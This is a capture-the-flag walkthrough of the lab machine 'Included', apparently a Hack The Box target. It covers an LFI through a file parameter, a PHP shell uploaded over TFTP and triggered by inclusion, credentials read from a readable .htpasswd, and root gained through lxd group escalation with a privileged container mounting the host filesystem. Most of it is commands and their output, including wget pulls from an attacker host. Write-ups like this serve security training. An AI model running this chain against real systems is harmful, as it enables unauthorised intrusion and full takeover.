# Included

## Enumeration

### nmap

```
PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was http://10.129.108.75/?file=home.php

```
I used `-sU` with nmap and still got no udp port open 

I guess the service is just `tftp`

there is bland obvious `LFI` on the website with `file` parameter


From `/etc/passwd` there is a user named `mike`

For access install tfpt on your side to (sudo apt for debian users)

Then connect and upload a php shell

```
└──╼ $tftp 10.129.108.75
tftp> put shell.php
Sent 4057 bytes in 1.4 seconds
tftp> 
```

then prepare a listener and include `file=/var/lib/tftpboot/shell.php` to activate your shell

Only `mike` can read the user flag so we need lateral movement

In the web folder we notice we can read some files

```
drwxr-xr-x 4 root     root      4096 Oct 13 19:50 .
drwxr-xr-x 3 root     root      4096 Apr 23  2021 ..
-rw-r--r-- 1 www-data www-data   212 Apr 23  2021 .htaccess
-rw-r--r-- 1 www-data www-data    17 Apr 23  2021 .htpasswd
-rw-r--r-- 1 www-data www-data 13828 Apr 29  2014 default.css
drwxr-xr-x 2 www-data www-data  4096 Apr 23  2021 fonts
-rw-r--r-- 1 www-data www-data 20448 Apr 29  2014 fonts.css
-rw-r--r-- 1 www-data www-data  3704 Oct 13 19:50 home.php
drwxr-xr-x 2 www-data www-data  4096 Apr 23  2021 images
-rw-r--r-- 1 www-data www-data   145 Oct 13 19:49 index.php
-rw-r--r-- 1 www-data www-data 17187 Apr 29  2014 license.txt
```
`.htpasswd` is readable? 

```
mike:Sheffield19
```
Evolve to mike and get user flag

```
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@included:/var/www/html$ su mike
su mike
Password: Sheffield19

mike@included:/var/www/html$ 
...
cat user.txt
user_flag_with_no_tricks

mike@included:~$ id
id
uid=1000(mike) gid=1000(mike) groups=1000(mike),108(lxd)

```

## Privilege escalation

Mike is in `lxd` group so yeah...`alpine` container it is

If its new to you Google `lxd privilege escalation` for more informations

Seriously if it sounds easy you better check [here](https://0x44696f21.wordpress.com/2020/08/18/building-lxd-containers-on-kali/) and you might end up [here](https://linuxcontainers.org/distrobuilder/introduction/) 

and [here](https://github.com/lxc/distrobuilder) XD

did it already so I just copied my old build from `distrobuilder`

then upload the build files on target machine with `wget`

```
wget http://10.10.15.58:80/lxd.tar.xz
--2021-12-17 12:05:02--  http://10.10.15.58/lxd.tar.xz
Connecting to 10.10.15.58:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 424 [application/x-xz]
Saving to: ‘lxd.tar.xz’

lxd.tar.xz          100%[===================>]     424  --.-KB/s    in 0.003s  

2021-12-17 12:05:03 (118 KB/s) - ‘lxd.tar.xz’ saved [424/424]


mike@included:/tmp$ wget http://10.10.15.58:80/rootfs.squashfs
--2021-12-17 12:06:05--  http://10.10.15.58/rootfs.squashfs
Connecting to 10.10.15.58:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1798144 (1.7M) [application/octet-stream]
Saving to: ‘rootfs.squashfs’

rootfs.squashfs     100%[===================>]   1.71M   459KB/s    in 4.2s    

2021-12-17 12:06:10 (421 KB/s) - ‘rootfs.squashfs’ saved [1798144/1798144]


```

Import the image on target machine as mymnimal

```
mike@included:/tmp$ lxc image import --alias myminimal lxd.tar.xz rootfs.squashfs
<import --alias myminimal lxd.tar.xz rootfs.squashfs
```
launch it

```
mike@included:/tmp$ lxc launch myminimal mycontainer
lxc launch myminimal mycontainer
Creating mycontainer
Starting mycontainer

```
check it
```
mike@included:/tmp$ lxc list mycontainer
lxc list mycontainer
+-------------+---------+------+-----------------------------------------------+------------+-----------+
|    NAME     |  STATE  | IPV4 |                     IPV6                      |    TYPE    | SNAPSHOTS |
+-------------+---------+------+-----------------------------------------------+------------+-----------+
| mycontainer | RUNNING |      | fd42:eff6:712f:c3a0:216:3eff:febb:4348 (eth0) | PERSISTENT | 0         |
+-------------+---------+------+-----------------------------------------------+------------+-----------+


```
create a new container with right priviledges

```
mike@included:/tmp$ lxc init myminimal ignite -c security.privileged=true
lxc init myminimal ignite -c security.privileged=true
Creating ignite

```

Mount the `/` folder in the container and start it

```
mike@included:/tmp$ lxc config device add ignite mydevice disk source=/ path=/mnt/
<device add ignite mydevice disk source=/ path=/mnt/
Device mydevice added to ignite
```
Get a root shell in that
```
mike@included:/tmp$ lxc start ignite
lxc start ignite

mike@included:/tmp$ lxc exec ignite /bin/sh
lxc exec ignite /bin/sh
~ # ^[[51;5R

OR

mike@included:/tmp$ lxc exec mycontainer -- sh
~ # id
uid=0(root) gid=0(root)
```
Go grab the flags where they are

```
~ # cd /mnt/root
/mnt/root # ls
bin             cdrom           etc             initrd.img      lib             lost+found      mnt             proc            run             snap            swap.img        tmp             var             vmlinuz.old
boot            dev             home            initrd.img.old  lib64           media           opt             root            sbin            srv             sys             usr             vmlinuz
/mnt/root # cd root
/mnt/root/root # ls
root.txt
cat root.txt
sike_real_flag_now_no_joke

```
And its done!


